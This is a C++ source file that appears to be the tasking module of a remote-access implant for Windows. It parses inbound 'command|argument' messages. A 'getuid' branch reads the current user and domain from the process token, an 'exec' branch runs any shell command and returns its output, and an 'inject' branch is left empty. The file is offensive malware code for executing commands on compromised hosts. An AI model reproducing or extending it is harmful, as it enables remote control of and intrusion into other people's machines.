#include "Tasking.h"

#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

BOOL ExecuteTasking(std::string inboundData, std::string& outboundData) {

	size_t offset = inboundData.find('|');

	if (offset == std::string::npos)
		return FALSE; // Invalid Data

	std::string command = inboundData.substr(0, offset);
	std::string argument = inboundData.substr(offset + 1);

	outboundData = "";

	if (command == "getuid") {

		CHAR username[256] = { 0 };
		CHAR domain[256] = { 0 };
		LPVOID TokenUserInfo[4096];
		DWORD sid_type = 0, returned_tokinfo_length;

		HANDLE hToken;

		ImpersonateSelf(SecurityDelegation);
		OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, true, &hToken);

		if (!GetTokenInformation(hToken, TokenUser, TokenUserInfo, 4096, &returned_tokinfo_length))
			return FALSE;

		DWORD length;
		if (!LookupAccountSidA(NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username, &length, domain, &length, (PSID_NAME_USE)& sid_type))
			return FALSE;

		outboundData.append(domain);
		outboundData.append("\\");
		outboundData.append(username);

		return TRUE;
	}
	else if (command == "exec") {

		std::array<char, 128> buffer;
		std::string result;
		std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(argument.c_str(), "r"), _pclose);

		if (pipe) {
			while (!feof(pipe.get()) && !ferror(pipe.get()) &&
				fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
				outboundData += buffer.data();
		}
	}
	else if (command == "inject") {

		
	}

	if (outboundData.empty()) {
		outboundData = "[Finished]";
	}

	return TRUE;
}